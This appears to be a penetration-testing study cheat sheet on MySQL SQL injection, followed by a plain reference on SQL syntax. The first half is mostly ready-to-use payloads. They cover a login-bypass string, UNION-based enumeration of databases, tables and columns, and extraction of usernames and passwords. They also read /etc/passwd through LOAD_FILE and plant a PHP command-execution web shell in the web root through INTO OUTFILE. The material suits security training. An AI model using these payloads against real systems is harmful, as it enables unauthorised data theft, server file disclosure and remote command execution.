
## Table of Contents:

- [[#Manual Injection]]
- [[#SQL Language]]
- [[SQLMap]]

---

## Manual Injection

### SQL Error trigger characters
| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |
### OR Injection with Comments

```sql
admin' or '1'='1
SELECT * FROM logins WHERE username='admin' or '1'='1' -- -AND password = 'something';
```

---
### Union Injection
##### 1. Detect Number of Columns
```SQL
** Using ORDER BY **

' order by 1-- -   -> OK
' order by 2-- -   -> OK
' order by 3-- -   -> OK
' order by 4-- -   -> OK
' order by 5-- -   -> Fail

# This means there is 4 column in the table
```

```SQL
** Using UNION **

cn' UNION select NULL-- -                 -> FAIL
cn' UNION select NULL,NULL,-- -           -> FAIL
cn' UNION select NULL,NULL,NULL-- -       -> FAIL
cn' UNION select NULL,NULL,NULL,NULL-- -  -> OK

-- attempt a Union injection with a different number of columns until we successfully get the results back. 
```

##### 2. Locate which column is reflected (First ? Second ? 2 and 3 ?)
```SQL
cn' UNION select 1,2,3,4-- -  -> OK

'--- Lets assume we see that 2,3,4 are relfected
```

##### 3. Inject
```SQL
cn' UNION select 1,@@version,3,4-- -
cn' UNION select 1,user(),3,4-- -
```

---

### Enumeration

We need the following information:
- List of databases
- List of tables within each database
- List of columns within each table

To reference a table present in another DB:
```sql
SELECT * FROM database.table;
```
###### Schemata (Find what databases are on the server)
```SQL
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
###### Current Database
```SQL
cn' UNION select 1,database(),2,3-- -
```
###### To find all tables within a database
```SQL
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
###### Enumerate Columns
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
###### Retrieve Data
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

#### Reading Files
The DB User need the *FILE* privilege to load file and read it.
###### 1. Retrieve DB User
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, current_user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
###### 2. Retrieve user privilege
```sql
SELECT super_priv FROM mysql.user

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
OR
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - # To specify the db user and limit the output
```
If the query return Y, it means that we have the FILE privilege.
###### 3. Others Privileges
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

To filter output:
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
###### 4. LOAD_FILE
```sql
SELECT LOAD_FILE('/etc/passwd');

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

We can now enumerate the web app or the filesystem.
```Note
If the file disclosure is not showing the expecting output (Php files for exemple), look at source code.
```

#### Writing File

To be able to write files to the back-end server using a MySQL database, we require three things:
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server
###### 1. Check for FILE privilege as shown above
###### 2. Check secure_file_priv
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
If the result shows that the `secure_file_priv` value is empty, that means we can read/write files to any location.
###### 3. Write to file
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

```Note
To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. 
```

----

## SQL Language
#### Creating a Database
```SQL
mysql> CREATE DATABASE users;
```
#### Creating a Table
```SQL
CREATE TABLE logins (
	id INT,
	username VARCHAR(100),
	password VARCHAR(100),
	data_of_joining DATETIME
	);
```

```SQL
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```

#### List table structure
```SQL
sql> describe logins;
```

#### INSERT Statement
```sql
# Fill All Column
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');

# Fill Specified Column
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');

# Insert Multiple Records
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

#### SELECT Statement
```SQL
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```

#### DROP Statement
```SQL
DROP TABLE logins;
```

#### ALTER Statement

We can use [ALTER](https://dev.mysql.com/doc/refman/8.0/en/alter-table.html) to change the name of any table and any of its fields or to delete or add a new column to an existing table.
```SQL
# Add a Column
ALTER TABLE logins ADD newColumn INT;

# Rename a Column
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;

# Modify a Column
ALTER TABLE logins MODIFY newerColumn DATE;

# Delete a Column
ALTER TABLE logins DROP newerColumn;
```

#### UPDATE Statement

While `ALTER` is used to change a table's properties, the [UPDATE](https://dev.mysql.com/doc/refman/8.0/en/update.html) statement can be used to update specific records within a table, based on conditions.
```SQL
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

#### Sorting Results
```SQl
SELECT * FROM logins ORDER BY password;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+

# Sorting ASC or DESC
SELECT * FROM logins ORDER BY password DESC;
```

#### LIMIT results
```SQL
SELECT * FROM logins LIMIT 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+----+---------------+------------+---------------------+


SELECT * FROM logins LIMIT 1, 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
```

#### WHERE Clause
```sql
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins where username = 'admin';
```

#### LIKE Clause

The `%` symbol acts as a wildcard
```SQL
SELECT * FROM logins WHERE username LIKE 'admin%';
```

Similarly, the `_` symbol is used to match exactly one character.
```SQL
SELECT * FROM logins WHERE username like '___';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
```

#### AND Operator
```SQL
SELECT 1 = 1 AND 'test' = 'test';
+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |
+---------------------------+


SELECT 1 = 1 AND 'test' = 'abc';
+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|                        0 |
+--------------------------+
```

#### OR Operator
```SQL
SELECT 1 = 1 OR 'test' = 'abc';
+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+


mysql> SELECT 1 = 2 OR 'test' = 'abc';
+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
```

#### NOT Operator
```SQL
SELECT NOT 1 = 1;
+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+


SELECT NOT 1 = 2;
+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |
+-----------+
```

#### Symbol Operators

The `AND`, `OR` and `NOT` operators can also be represented as `&&`, `||` and `!`, respectively.
```SQL
SELECT 1 = 1 && 'test' = 'abc';
+-------------------------+
| 1 = 1 && 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+


mysql> SELECT 1 = 1 || 'test' = 'abc';
+-------------------------+
| 1 = 1 || 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+


mysql> SELECT 1 != 1;
+--------+
| 1 != 1 |
+--------+
|      0 |
+--------+
```

#### Operators in queries
```SQL
SELECT * FROM logins WHERE username != 'john';
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

#### Operation Priority
- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

#### Union Clause
The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. 
```SQL
SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

```Note
The data types of the selected columns on all positions should be the same. A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.
```

*Tip*: Data type of junk must match with second query data type on corresponding column. For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

```SQL
SELECT * from products where product_id = '1' UNION SELECT username, NULL, NULL, NULL from passwords
```

---